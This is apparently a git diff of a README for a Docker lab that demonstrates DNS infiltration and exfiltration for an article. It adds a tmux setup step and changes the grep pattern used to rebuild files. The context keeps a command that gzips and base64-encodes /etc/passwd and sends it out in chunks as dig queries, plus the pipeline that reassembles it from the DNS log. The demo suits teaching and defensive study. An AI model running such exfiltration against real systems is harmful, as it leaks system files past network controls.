@@ -1,5 +1,5 @@
 # DNS infiltration and exfiltration demo
-This repository contains codes and examples used for an internal article.
+This repository contains codes and examples used for an article.
 ## Screeshots
 ![screenshot](/assets/screenshot.jpg)
 ## Requirements
@@ -18,6 +18,11 @@ docker exec -ti acme-dns sh
 docker exec -ti attacker-dns sh
 
 ```
+or if you have `tmux` installed just run this script to get a layout similar to the screenshot above:
+```
+tmux-setup.sh
+```
+
 ## Examples
 Send a file through DNS queries:
 ```
@@ -25,7 +30,7 @@ gzip -c /etc/passwd | base64 -w0 | fold -w63 | awk 'BEGIN {n = 100} {print "dig 
 ```
 Reassemble file from query log file:
 ```
-grep "query\[A\] c" /var/log/dnsmasq.log | awk '{print $6}' | sort -u | cut -d "." -f2 | base64 -d | gunzip -d > mynewfile
+grep -E "query\[A\] c\d{3}\." /var/log/dnsmasq.log | awk '{print $6}' | sort -u | cut -d "." -f2 | base64 -d | gunzip -d > mynewfile
 ```
 Create TXT record from "sl" binary:
 ```
